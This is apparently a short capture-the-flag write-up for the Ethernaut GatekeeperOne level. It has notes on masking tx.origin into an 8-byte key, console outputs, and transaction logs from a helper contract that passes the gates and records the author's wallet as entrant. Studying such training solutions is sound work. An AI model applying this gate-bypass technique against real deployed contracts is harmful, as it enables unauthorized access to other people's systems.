 ## Ethernaut-solution

 ### 13. GateKeeperOne-Solution.md
 
  1- 0x0000FFFF(uint32) == 0xFFFF(uint16)value > Mask with 0's  > ox... >0000< ...FFFF

   // uint 32 bits = 4 bytes (0x0000FFFF) ... uint16 bits = 2 bytes (0xFFFF)
```
   0x00007f24 = 0x7f24 
```

  2- 0x0000FFFF != oxFFFFFFFF0000FFFF(uint64) value > Mask with F, which is "1111" in binary (15 in digit)

    // 0x ...> FFFFFFFF< ... 0000FFFF

    // uint 64 bits = 8 bytes (0xFFFFFFFF0000FFFF)
```
    0x24812Ee400007f24 != 0x00007f24
```

   3- 0x0000FFFF == uint16 tx.origin value

   //bytes8 txOrigin16 = 0x24812Ee4249E7f24;

   //bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

     // 8 bytes > 0x24812Ee4249E7f24

     // Mask    > 0xFFFFFFFF0000FFFF

     // key     > 0x24812Ee400007f24

     0x00007f24 == 0x24812Ee400007f24

     // 0xFFFFFFFF0000FFFF < 64 bits  8bytes 

     // 0x0000FFFF < 32bits  4bytes

     // 0xFFFF < 16bits 

     2bytes                                                                               

```
>await contract.abi
(2) [{…}, {…}]
0: {inputs: Array(1), name: 'enter', outputs: Array(1), stateMutability: 'nonpayable', type: 'function', …}
1: {inputs: Array(0), name: 'entrant', outputs: Array(1), stateMutability: 'view', type: 'function', …}
length: 2
[[Prototype]]: Array(0)
```
```
>await cotract.entrant()
'0x0000000000000000000000000000000000000000' //false 
```
```
await contract.address //target of this time 
'0xe81908a928314216a68AdA2B78795E244Fe56b2b'
```

//deploy contract 
```
[block:10920961 txIndex:5]from: 0xF6e...f30F5to: AreYouTheKeymaster.(constructor)value: 0 weidata: 0x608...70033logs: 0hash: 0xbfb...3954d
```

//setGateKeeperOne with target contract address
```
[block:10920971 txIndex:1]from: 0xF6e...f30F5to: AreYouTheKeymaster.setGatekeeperOne(address) 0xf6D...F5b65value: 0 weidata: 0x152...56b2blogs: 0hash: 0x522...36ebb
```

//setting as gkpOne(gatekeeperone) convert from target of contract address 
```
0:
address: 0xe81908a928314216a68AdA2B78795E244Fe56b2b
```

//letMeIn 
```
[block:10920992 txIndex:1]from: 0xF6e...f30F5to: AreYouTheKeymaster.letMeIn() 0xf6D...F5b65value: 0 weidata: 0x7ab...07720logs: 0hash: 0x4f7...4f489
```

// 自分のwalletをentrant(参加者)にすることに成功
```
>await contract.entrant()
'0xF6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5'
```